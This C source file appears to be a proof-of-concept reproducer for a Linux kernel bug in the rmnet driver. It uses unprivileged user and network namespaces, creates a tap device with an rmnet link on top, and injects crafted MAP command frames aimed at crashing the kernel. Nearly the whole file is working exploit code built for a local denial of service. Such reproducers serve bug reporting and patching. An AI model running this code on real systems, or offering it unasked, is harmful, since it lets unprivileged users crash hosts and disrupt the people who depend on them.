// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_tun.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_link.h>
#include <linux/if_arp.h>

#ifndef IFLA_RMNET_MUX_ID
#define IFLA_RMNET_MUX_ID 1
#endif
#ifndef IFLA_RMNET_FLAGS
#define IFLA_RMNET_FLAGS  2
#endif
#ifndef RMNET_FLAGS_INGRESS_DEAGGREGATION
#define RMNET_FLAGS_INGRESS_DEAGGREGATION (1U << 0)
#endif
#ifndef RMNET_FLAGS_INGRESS_MAP_COMMANDS
#define RMNET_FLAGS_INGRESS_MAP_COMMANDS  (1U << 1)
#endif

#ifndef IFLA_RMNET_MAX
struct ifla_rmnet_flags {
	unsigned int flags;
	unsigned int mask;
};
#endif

#define MAP_CMD_FLAG 0x80
#define RMNET_MAP_COMMAND_FLOW_ENABLE 2

#define MUX_ID 0

static int die(const char *m) { perror(m); exit(1); }

static void nl_add_attr(struct nlmsghdr *nlh, int type, const void *data, int len)
{
	struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = RTA_LENGTH(len);
	memcpy(RTA_DATA(rta), data, len);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static struct rtattr *nl_nest_start(struct nlmsghdr *nlh, int type)
{
	struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = RTA_LENGTH(0);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
	return rta;
}

static void nl_nest_end(struct nlmsghdr *nlh, struct rtattr *nest)
{
	nest->rta_len = (char *)nlh + nlh->nlmsg_len - (char *)nest;
}

static int nl_send_recv(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	struct iovec iov = { nlh, nlh->nlmsg_len };
	struct msghdr msg = { &sa, sizeof(sa), &iov, 1, NULL, 0, 0 };
	char buf[8192];

	if (sendmsg(fd, &msg, 0) < 0)
		return -1;

	iov.iov_base = buf;
	iov.iov_len = sizeof(buf);
	int n = recvmsg(fd, &msg, 0);
	if (n < 0)
		return -1;

	struct nlmsghdr *r = (struct nlmsghdr *)buf;
	for (; NLMSG_OK(r, n); r = NLMSG_NEXT(r, n)) {
		if (r->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *e = NLMSG_DATA(r);
			if (e->error) {
				errno = -e->error;
				return -1;
			}
			return 0;
		}
	}
	return 0;
}

static int tap_open(const char *name, int *ifindex)
{
	int fd = open("/dev/net/tun", O_RDWR);
	if (fd < 0) die("open /dev/net/tun");

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	ifr.ifr_flags = IFF_TAP | IFF_NO_PI;
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	if (ioctl(fd, TUNSETIFF, &ifr) < 0) die("TUNSETIFF");

	*ifindex = if_nametoindex(name);
	if (!*ifindex) die("if_nametoindex tap");
	return fd;
}

static void iface_up(const char *name)
{
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) die("socket up");
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) die("SIOCGIFFLAGS");
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) die("SIOCSIFFLAGS");
	close(s);
}

static int create_rmnet(int nlfd, int real_ifindex, const char *rmnet_name)
{
	char buf[1024];
	memset(buf, 0, sizeof(buf));
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct ifinfomsg *ifi;

	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ifi));
	nlh->nlmsg_type = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq = 1;
	ifi = NLMSG_DATA(nlh);
	ifi->ifi_family = AF_UNSPEC;

	__u32 link = real_ifindex;
	nl_add_attr(nlh, IFLA_LINK, &link, sizeof(link));

	nl_add_attr(nlh, IFLA_IFNAME, rmnet_name, strlen(rmnet_name) + 1);

	struct rtattr *linkinfo = nl_nest_start(nlh, IFLA_LINKINFO);
	nl_add_attr(nlh, IFLA_INFO_KIND, "rmnet", strlen("rmnet") + 1);

	struct rtattr *infodata = nl_nest_start(nlh, IFLA_INFO_DATA);
	__u16 mux_id = MUX_ID;
	nl_add_attr(nlh, IFLA_RMNET_MUX_ID, &mux_id, sizeof(mux_id));

	struct ifla_rmnet_flags rf;

	rf.mask  = RMNET_FLAGS_INGRESS_DEAGGREGATION | RMNET_FLAGS_INGRESS_MAP_COMMANDS;
	rf.flags = RMNET_FLAGS_INGRESS_DEAGGREGATION | RMNET_FLAGS_INGRESS_MAP_COMMANDS;
	nl_add_attr(nlh, IFLA_RMNET_FLAGS, &rf, sizeof(rf));
	nl_nest_end(nlh, infodata);

	nl_nest_end(nlh, linkinfo);

	return nl_send_recv(nlfd, nlh);
}

int main(void)
{

	uid_t uid = getuid();
	gid_t gid = getgid();

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {

		perror("unshare(NEWUSER|NEWNET) -- continuing (may be root)");
		if (unshare(CLONE_NEWNET) < 0)
			perror("unshare(NEWNET)");
	} else {
		char p[64];
		int f;
		f = open("/proc/self/setgroups", O_WRONLY);
		if (f >= 0) { write(f, "deny", 4); close(f); }
		f = open("/proc/self/uid_map", O_WRONLY);
		if (f >= 0) { int n = snprintf(p, sizeof(p), "0 %d 1\n", uid); write(f, p, n); close(f); }
		f = open("/proc/self/gid_map", O_WRONLY);
		if (f >= 0) { int n = snprintf(p, sizeof(p), "0 %d 1\n", gid); write(f, p, n); close(f); }
	}

	int tap_ifindex;
	int tapfd = tap_open("tap0", &tap_ifindex);
	iface_up("tap0");
	printf("[+] tap0 created, ifindex=%d\n", tap_ifindex);

	int nlfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (nlfd < 0) die("netlink socket");

	if (create_rmnet(nlfd, tap_ifindex, "rmnet0") < 0) {
		perror("create_rmnet");
		fprintf(stderr, "[-] failed to create rmnet link\n");
		exit(1);
	}
	printf("[+] rmnet0 created on tap0 (mux_id=%d, INGRESS_MAP_COMMANDS|DEAGGREGATION)\n", MUX_ID);

	iface_up("rmnet0");

	unsigned char frame[64];
	memset(frame, 0, sizeof(frame));

	unsigned short pkt_len = 16;
	frame[0] = MAP_CMD_FLAG;
	frame[1] = MUX_ID;
	frame[2] = (pkt_len >> 8) & 0xff;
	frame[3] = pkt_len & 0xff;
	frame[4] = RMNET_MAP_COMMAND_FLOW_ENABLE;

	printf("[+] injecting crafted MAP-command frame into tap0 ...\n");
	fflush(stdout);

	for (int i = 0; i < 8; i++) {
		ssize_t w = write(tapfd, frame, sizeof(frame));
		if (w < 0) perror("write tap");
	}

	sleep(2);
	printf("[+] done (if still alive, no crash this round)\n");
	return 0;
}
